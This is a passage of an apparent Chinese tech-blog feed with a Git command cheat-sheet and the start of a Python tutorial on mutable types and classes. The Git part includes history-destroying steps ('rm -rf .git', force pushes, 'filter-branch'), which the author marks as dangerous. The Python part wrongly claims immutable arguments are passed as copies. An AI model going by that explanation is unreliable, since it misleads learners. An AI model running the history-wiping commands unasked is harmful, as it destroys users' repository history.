ecx*2]</code></td><td>等效于：<code>eax = ecx * 3</code></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;针对amd架构的汇编有Intel和AT&amp;amp;T两种语法， 下面的介绍都是以Intel语法为主进行说明，主要是针对的系统是System V ABI，Linux，也是目前主流的情况&lt;/p&gt;
&lt;h1 id=&quot;寄存器&quot;&gt;&lt;a href=&quot;#寄存器&quot; class=&quot;headerl</summary>
      
    
    
    
    
    <category term="汇编" scheme="https://lyi61pd.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Git</title>
    <link href="https://lyi61pd.github.io/2025/06/30/Git/"/>
    <id>https://lyi61pd.github.io/2025/06/30/Git/</id>
    <published>2025-06-30T00:00:00.000Z</published>
    <updated>2025-07-30T03:41:17.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p>直接复制gitlab的，稍微改了点，还是待优化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Git global setup</span></span><br><span class="line">git config --global user.name <span class="string">&quot;xxx&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a new repository</span></span><br><span class="line">git <span class="built_in">clone</span> xxxx</span><br><span class="line"><span class="built_in">cd</span> uscan</span><br><span class="line">git switch -c main</span><br><span class="line"><span class="built_in">touch</span> README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m <span class="string">&quot;add README&quot;</span></span><br><span class="line">git push -u origin main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Push an existing folder</span></span><br><span class="line"><span class="built_in">cd</span> existing_folder</span><br><span class="line">git init</span><br><span class="line">git checkout -b main</span><br><span class="line">git remote add origin xxxxxx</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;Initial commit&quot;</span></span><br><span class="line">git push -u origin main</span><br><span class="line"></span><br><span class="line"><span class="comment"># Push an existing Git repository</span></span><br><span class="line"><span class="built_in">cd</span> existing_repo</span><br><span class="line">git remote rename origin old-origin</span><br><span class="line">git remote add origin g**@company***.com:ut******/uscan.git</span><br><span class="line">git push -u origin --all</span><br><span class="line">git push -u origin --tags</span><br></pre></td></tr></table></figure><h2 id="强制将本地状态同步到远程仓库并清空历史记录"><a href="#强制将本地状态同步到远程仓库并清空历史记录" class="headerlink" title="强制将本地状态同步到远程仓库并清空历史记录"></a>强制将本地状态同步到远程仓库并清空历史记录</h2><p>危险操作, 确保知道自己在做什么再这么搞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rm -rf .git</span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;Initial commit - reset history&quot;</span><br><span class="line">git remote add origin g**@gi***.com:lyi61pd/blog.git</span><br><span class="line">git branch -M main</span><br><span class="line">git push -f origin main</span><br></pre></td></tr></table></figure><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><h3 id="删除本地的远程分支跟踪引用"><a href="#删除本地的远程分支跟踪引用" class="headerlink" title="删除本地的远程分支跟踪引用"></a>删除本地的远程分支跟踪引用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote prune origin</span><br></pre></td></tr></table></figure><h3 id="查看所有分支"><a href="#查看所有分支" class="headerlink" title="查看所有分支"></a>查看所有分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure><h3 id="删除远程分支"><a href="#删除远程分支" class="headerlink" title="删除远程分支"></a>删除远程分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin --delete feature-前端操作按钮颜色及布局调整</span><br></pre></td></tr></table></figure><h3 id="删除本地分支"><a href="#删除本地分支" class="headerlink" title="删除本地分支"></a>删除本地分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d feature-前端操作按钮颜色及布局调整</span><br></pre></td></tr></table></figure><h3 id="切换当前分支"><a href="#切换当前分支" class="headerlink" title="切换当前分支"></a>切换当前分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout dev</span><br></pre></td></tr></table></figure><h3 id="更新默认分支origin-HEAD"><a href="#更新默认分支origin-HEAD" class="headerlink" title="更新默认分支origin&#x2F;HEAD"></a>更新默认分支origin&#x2F;HEAD</h3><p>先去gitlab-&gt;settings设置，然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git fetch origin</span><br><span class="line">git remote set-head origin -a</span><br></pre></td></tr></table></figure><h3 id="新建本地分支"><a href="#新建本地分支" class="headerlink" title="新建本地分支"></a>新建本地分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch new_branch_name</span><br></pre></td></tr></table></figure><h3 id="新建远程分支"><a href="#新建远程分支" class="headerlink" title="新建远程分支"></a>新建远程分支</h3><p>基于本地当前分支，推送到远程分支，如果远程分支不存在相当于新建远程分支</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --set-upstream origin feature-架构划分合入clickhouse迁移</span><br></pre></td></tr></table></figure><h3 id="新建本地分支并切换到该分支"><a href="#新建本地分支并切换到该分支" class="headerlink" title="新建本地分支并切换到该分支"></a>新建本地分支并切换到该分支</h3><p>相当于</p><p>:::info<br>git branch new_branch_name</p><p>git checkout new_branch_name</p><p>:::</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b new_branch_name</span><br></pre></td></tr></table></figure><h3 id="查看本地分支和远程分支的跟踪关系"><a href="#查看本地分支和远程分支的跟踪关系" class="headerlink" title="查看本地分支和远程分支的跟踪关系"></a>查看本地分支和远程分支的跟踪关系</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -vv</span><br></pre></td></tr></table></figure><p>返回结果例子</p><p>:::info</p><ul><li><p>master                abc1234 [origin&#x2F;master] Initial commit</p><p>feature-branch        def5678 [origin&#x2F;feature-branch] Added new feature</p><p>another-branch        ghi9101 Added another feature</p></li></ul><p>:::</p><p>在这个示例中：</p><ul><li>master 分支跟踪 origin&#x2F;master</li><li>feature-branch 分支跟踪 origin&#x2F;feature-branch</li><li>another-branch 没有跟踪任何远程分支</li></ul><h3 id="设置本地分支和远程分支的跟踪关系"><a href="#设置本地分支和远程分支的跟踪关系" class="headerlink" title="设置本地分支和远程分支的跟踪关系"></a>设置本地分支和远程分支的跟踪关系</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --set-upstream-to=origin/origin_branch_name local_branch_name</span><br></pre></td></tr></table></figure><h2 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h2><h3 id="合并多个Commit"><a href="#合并多个Commit" class="headerlink" title="合并多个Commit"></a>合并多个Commit</h3><p>合并最近的5个commit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i HEAD~5</span><br></pre></td></tr></table></figure><p>会有这样的画面</p><p><img src="/blog_imgs/Git/1720691456171-86166bbf-1321-4c45-a1b4-f2b9c22220c3.png"></p><p>然后改成</p><p><img src="/blog_imgs/Git/1720691528190-6b5890c8-ba99-4cd6-a20a-58d2464546a8.png"></p><p>然后ctrl+o enter ctrl+x</p><p>然后会有这样的画面</p><p><img src="/blog_imgs/Git/1720691598392-d8184fe0-f32b-4314-a2f7-fd9a2906fced.png"></p><p>这里改成想要提交commit记录的说明内容</p><p><img src="/blog_imgs/Git/1720691639533-f13c0e2a-5b48-4ff3-8a7b-83fb55efab16.png"></p><p>然后ctrl+o enter ctrl+x</p><p>本地commit记录已合并完成</p><p>推送到远程仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --force</span><br></pre></td></tr></table></figure><h3 id="删除某个文件的所有commit记录"><a href="#删除某个文件的所有commit记录" class="headerlink" title="删除某个文件的所有commit记录"></a>删除某个文件的所有commit记录</h3><p>比如项目里有个sql，如果反复更新这个sql，仓库会变得很大，如果可以的话，可以全部删掉</p><p>删除前先备份，因为这个命令会把当前的也删掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git filter-branch --force --index-filter \</span><br><span class="line">&quot;git rm --cached --ignore-unmatch path/to/the/file&quot; \</span><br><span class="line">--prune-empty --tag-name-filter cat -- --all</span><br></pre></td></tr></table></figure><p>然后再把备份的搞过来，重新提交commit，这样历史的就没了，只留下最新的</p><p>然后如果有其他协作者, 因为远程commit历史被修改了, 其他协作者本地会出现不同步的问题, 这时候需要这样同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git fetch origin</span><br><span class="line">git reset --hard origin/your-branch-name</span><br></pre></td></tr></table></figure><h2 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h2><h3 id="gitignore不生效"><a href="#gitignore不生效" class="headerlink" title=".gitignore不生效"></a>.gitignore不生效</h3><p>如果文件或目录已经被 Git 跟踪，那么即使它们在 <code>.gitignore</code> 中被列出，Git 也会继续跟踪它们，需要先从 Git 仓库中移除这些文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git rm -r --cached .</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;Remove ignored files from tracking&quot;</span><br></pre></td></tr></table></figure><h2 id="Tag"><a href="#Tag" class="headerlink" title="Tag"></a>Tag</h2><h3 id="查看本地所有Tag"><a href="#查看本地所有Tag" class="headerlink" title="查看本地所有Tag"></a>查看本地所有Tag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure><h3 id="查看远程所有Tag"><a href="#查看远程所有Tag" class="headerlink" title="查看远程所有Tag"></a>查看远程所有Tag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git ls-remote --tags origin</span><br></pre></td></tr></table></figure><h3 id="基于当前commit新建Tag"><a href="#基于当前commit新建Tag" class="headerlink" title="基于当前commit新建Tag"></a>基于当前commit新建Tag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag 0.1</span><br></pre></td></tr></table></figure><h3 id="将本地Tag推送到远程"><a href="#将本地Tag推送到远程" class="headerlink" title="将本地Tag推送到远程"></a>将本地Tag推送到远程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin 0.1</span><br></pre></td></tr></table></figure><h3 id="拉取远程的Tag"><a href="#拉取远程的Tag" class="headerlink" title="拉取远程的Tag"></a>拉取远程的Tag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch --tags</span><br></pre></td></tr></table></figure><p>本地只增不删，所以如果远程删了，同步到本地的时候，本地并不会删，需要手动删</p><h3 id="删除本地的Tag"><a href="#删除本地的Tag" class="headerlink" title="删除本地的Tag"></a>删除本地的Tag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -d 0.1</span><br></pre></td></tr></table></figure><h3 id="删除远程的Tag"><a href="#删除远程的Tag" class="headerlink" title="删除远程的Tag"></a>删除远程的Tag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --delete origin 0.1</span><br></pre></td></tr></table></figure><h2 id="PR"><a href="#PR" class="headerlink" title="PR"></a>PR</h2><h3 id="切换至远程的PR"><a href="#切换至远程的PR" class="headerlink" title="切换至远程的PR"></a>切换至远程的PR</h3><p>相当于在本地新建了个pr-1分支，把远程的提交拉过来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git ls-remote origin &#x27;pull/*/head&#x27;</span><br><span class="line">git fetch origin refs/pull/1/head</span><br><span class="line">git checkout -b pr-1 FETCH_HEAD</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;初始化&quot;&gt;&lt;a href=&quot;#初始化&quot; class=&quot;headerlink&quot; title=&quot;初始化&quot;&gt;&lt;/a&gt;初始化&lt;/h2&gt;&lt;h3 id=&quot;新建仓库&quot;&gt;&lt;a href=&quot;#新建仓库&quot; class=&quot;headerlink&quot; title=&quot;新建仓库&quot;&gt;&lt;/a&gt;新建仓</summary>
      
    
    
    
    
    <category term="Git" scheme="https://lyi61pd.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Python</title>
    <link href="https://lyi61pd.github.io/2025/04/22/Python/"/>
    <id>https://lyi61pd.github.io/2025/04/22/Python/</id>
    <published>2025-04-22T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引用与非引用类型"><a href="#引用与非引用类型" class="headerlink" title="引用与非引用类型"></a>引用与非引用类型</h1><h2 id="Python中的引用类型与非引用类型"><a href="#Python中的引用类型与非引用类型" class="headerlink" title="Python中的引用类型与非引用类型"></a>Python中的引用类型与非引用类型</h2><p>在Python中，数据类型可以分为引用类型（可变类型）和非引用类型（不可变类型）。它们在内存中的存储方式和函数传参时的行为有明显的区别。</p><h2 id="引用类型与非引用类型"><a href="#引用类型与非引用类型" class="headerlink" title="引用类型与非引用类型"></a>引用类型与非引用类型</h2><h3 id="引用类型（可变类型）"><a href="#引用类型（可变类型）" class="headerlink" title="引用类型（可变类型）"></a>引用类型（可变类型）</h3><p>引用类型是指那些在内存中可以被修改的对象。常见的引用类型包括：</p><ul><li><strong>列表（List）</strong></li><li><strong>字典（Dict）</strong></li><li><strong>集合（Set）</strong></li></ul><p>这些类型的对象在创建后，其内容是可以修改的。对于这些类型的数据，当它们作为函数参数传递时，实际上传递的是对象的<strong>引用</strong>（即内存地址）。因此，在函数内对该对象进行修改时，原始对象的内容会发生变化。</p><p><strong>示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_list</span>(<span class="params">my_list</span>):</span><br><span class="line">    my_list.append(<span class="number">4</span>)  <span class="comment"># 修改传入的列表</span></span><br><span class="line"></span><br><span class="line">lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">modify_list(lst)</span><br><span class="line"><span class="built_in">print</span>(lst)  <span class="comment"># 输出：[1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure><p>在这个例子中，传入<code>modify_list</code>函数的是列表<code>lst</code>的引用，因此在函数内部对<code>lst</code>进行修改时，原始的<code>lst</code>也发生了变化。</p><h3 id="非引用类型（不可变类型）"><a href="#非引用类型（不可变类型）" class="headerlink" title="非引用类型（不可变类型）"></a>非引用类型（不可变类型）</h3><p>非引用类型是指那些不能在内存中被修改的对象。常见的不可变类型包括：</p><ul><li><strong>整数（int）</strong></li><li><strong>浮点数（float）</strong></li><li><strong>字符串（str）</strong></li><li><strong>元组（tuple）</strong></li></ul><p>这些类型的对象一旦创建，其值不可更改。当它们作为函数参数传递时，传递的是该对象的<strong>副本</strong>。即使在函数内修改参数，原始对象的值也不会发生变化，因为不可变对象无法被修改，任何修改都会创建一个新的对象。</p><p><strong>示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_integer</span>(<span class="params">x</span>):</span><br><span class="line">    x += <span class="number">1</span>  <span class="comment"># 修改传入的整数</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">5</span></span><br><span class="line">modify_integer(a)</span><br><span class="line"><span class="built_in">print</span>(a)  <span class="comment"># 输出：5</span></span><br></pre></td></tr></table></figure><p>在上述代码中，<code>a</code>的值传递给<code>modify_integer</code>函数时，实际上是传递了<code>a</code>的值副本（5）。在函数内部，<code>x</code>的值发生变化，但<code>a</code>本身没有受到影响。</p><h2 id="函数传参与引用类型、非引用类型的关系"><a href="#函数传参与引用类型、非引用类型的关系" class="headerlink" title="函数传参与引用类型、非引用类型的关系"></a>函数传参与引用类型、非引用类型的关系</h2><h3 id="引用类型传参"><a href="#引用类型传参" class="headerlink" title="引用类型传参"></a>引用类型传参</h3><p>对于引用类型（如列表、字典等），函数接收到的是对象的引用。这意味着，函数内部修改了该对象，原始对象也会受到影响。</p><p><strong>示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_dict</span>(<span class="params">d</span>):</span><br><span class="line">    d[<span class="string">&quot;key&quot;</span>] = <span class="string">&quot;new_value&quot;</span>  <span class="comment"># 修改传入的字典</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>: <span class="string">&quot;old_value&quot;</span>&#125;</span><br><span class="line">modify_dict(data)</span><br><span class="line"><span class="built_in">print</span>(data)  <span class="comment"># 输出：&#123;&#x27;key&#x27;: &#x27;new_value&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，字典<code>data</code>作为参数传入<code>modify_dict</code>函数。因为字典是可变的，所以修改字典的内容会影响到原始字典<code>data</code>。</p><h3 id="非引用类型传参"><a href="#非引用类型传参" class="headerlink" title="非引用类型传参"></a>非引用类型传参</h3><p>对于不可变类型（如整数、字符串、元组等），函数接收到的是对象的值副本。尽管函数内部对该对象进行了修改，但这并不会改变原始对象的值。原因在于这些对象是不可变的，修改操作会创建新的对象。</p><p><strong>示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_string</span>(<span class="params">s</span>):</span><br><span class="line">    s += <span class="string">&quot; world&quot;</span>  <span class="comment"># 创建了新的字符串对象</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;hello&quot;</span></span><br><span class="line">modify_string(str1)</span><br><span class="line"><span class="built_in">print</span>(str1)  <span class="comment"># 输出：hello</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>str1</code>作为参数传入<code>modify_string</code>函数。由于字符串是不可变的，<code>s += &quot; world&quot;</code>会创建一个新的字符串对象，<code>str1</code>保持不变。</p><hr><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>在Python中，类是创建对象的模板。类定义了对象的属性和方法，通过类可以创建多个对象，每个对象都有自己的属性和方法。理解类的基本概念是学习面向对象编程的第一步。</p><h2 id="Python中的类与对象"><a href="#Python中的类与对象" class="headerlink" title="Python中的类与对象"></a>Python中的类与对象</h2><p>Python是一种面向对象的编程语言，其中类是面向对象编程的核心。类是创建对象的模板，而对象则是类的实例。理解类与对象是学习Python的重要基础。</p><h3 id="定义一个类"><a href="#定义一个类" class="headerlink" title="定义一个类"></a>定义一个类</h3><p>在Python中，类是通过<code>class</code>关键字来定义的。类包含了属性（也叫成员变量）和方法（也叫成员函数）。类的定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="comment"># 类属性</span></span><br><span class="line">    species = <span class="string">&quot;Canis familiaris&quot;</span>  <span class="comment"># 所有Dog对象共享的属性</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化方法，用于初始化对象的属性</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name  <span class="comment"># 实例属性</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age  <span class="comment"># 实例属性</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方法：类的行为</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bark</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> says Woof!&quot;</span>)</span><br></pre></td></tr></table></figure><p>在上面的例子中，<code>Dog</code>类有：</p><ul><li>一个类属性<code>species</code>，所有<code>Dog</code>对象共享这个属性。</li><li>两个实例属性<code>name</code>和<code>age</code>，每个对象都有独立的属性。</li><li>一个方法<code>bark</code>，表示狗叫的动作。</li></ul><h3 id="创建类的实例（对象）"><a href="#创建类的实例（对象）" class="headerlink" title="创建类的实例（对象）"></a>创建类的实例（对象）</h3><p>类定义好后，可以使用类来创建对象。通过调用类名并传入所需的参数来创建对象，每个对象都有自己独立的属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建Dog类的实例</span></span><br><span class="line">dog1 = Dog(<span class="string">&quot;Buddy&quot;</span>, <span class="number">3</span>)</span><br><span class="line">dog2 = Dog(<span class="string">&quot;Lucy&quot;</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问对象的属性</span></span><br><span class="line"><span class="built_in">print</span>(dog1.name)  <span class="comment"># 输出：Buddy</span></span><br><span class="line"><span class="built_in">print</span>(dog2.age)   <span class="comment"># 输出：5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用对象的方法</span></span><br><span class="line">dog1.bark()  <span class="comment"># 输出：Buddy says Woof!</span></span><br><span class="line">dog2.bark()  <span class="comment"># 输出：Lucy says Woof!</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>dog1</code>和<code>dog2</code>是<code>Dog</code>类的实例，它们各自拥有不同的<code>name</code>和<code>age</code>属性。通过调用<code>bark()</code>方法，它们分别发出不同的叫声。</p><h2 id="init-方法与构造函数"><a href="#init-方法与构造函数" class="headerlink" title="__init__方法与构造函数"></a><code>__init__</code>方法与构造函数</h2><h3 id="init-方法"><a href="#init-方法" class="headerlink" title="__init__方法"></a><code>__init__</code>方法</h3><p>在Python中，<code>__init__</code>方法是类的构造函数。当创建类的实例时，<code>__init__</code>方法会自动调用。它用于初始化新创建对象的属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, color</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.color = color</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">meow</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> says Meow!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个Cat对象</span></span><br><span class="line">cat = Cat(<span class="string">&quot;Whiskers&quot;</span>, <span class="string">&quot;black&quot;</span>)</span><br><span class="line">cat.meow()  <span class="comment"># 输出：Whiskers says Meow!</span></span><br></pre></td></tr></table></figure><h3 id="self参数"><a href="#self参数" class="headerlink" title="self参数"></a><code>self</code>参数</h3><p><code>__init__</code>方法中的第一个参数是<code>self</code>，它代表类的实例本身。当创建对象时，<code>self</code>会指向当前对象。每个方法都必须包含<code>self</code>参数，以便访问类的属性和方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name  <span class="comment"># self指向当前实例对象</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">display_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> is <span class="subst">&#123;self.age&#125;</span> years old.&quot;</span>)</span><br><span class="line"></span><br><span class="line">dog = Dog(<span class="string">&quot;Buddy&quot;</span>, <span class="number">3</span>)</span><br><span class="line">dog.display_info()  <span class="comment"># 输出：Buddy is 3 years old.</span></span><br></pre></td></tr></table></figure><h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>继承是面向对象编程中的重要概念，它允许一个类继承另一个类的属性和方法。在Python中，子类继承父类时，可以重用父类的方法，也可以扩展或重写父类的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, species</span>):</span><br><span class="line">        <span class="variable language_">self</span>.species = species</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.species&#125;</span> makes a sound&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(<span class="string">&quot;Dog&quot;</span>)  <span class="comment"># 调用父类的构造函数</span></span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> says Woof!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 